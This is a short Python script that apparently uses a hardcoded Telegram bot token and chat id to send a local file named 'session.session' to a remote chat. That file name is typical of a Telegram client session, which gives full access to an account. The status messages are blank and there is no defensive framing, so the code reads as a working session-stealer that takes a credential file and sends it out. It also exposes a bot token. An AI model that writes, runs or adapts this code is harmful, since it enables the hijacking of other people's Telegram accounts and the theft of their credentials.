import os
import asyncio
from telegram import Bot

token = '7346673656:AAFqLxeJkGlysL32hyUA74ucU7g0nsPvVWc'  
id = '652950846' 

async def send_file(file_path):
    
    bot = Bot(token=token)

    
    if os.path.exists(file_path):
        with open(file_path, 'rb') as file:
            
            await bot.send_document(chat_id=id, document=file)
            print(f"")
    else:
        print(f" ")

if __name__ == '__main__':

    file_to_send = 'session.session'
    
    # Запускаем асинхронный цикл
    asyncio.run(send_file(file_to_send))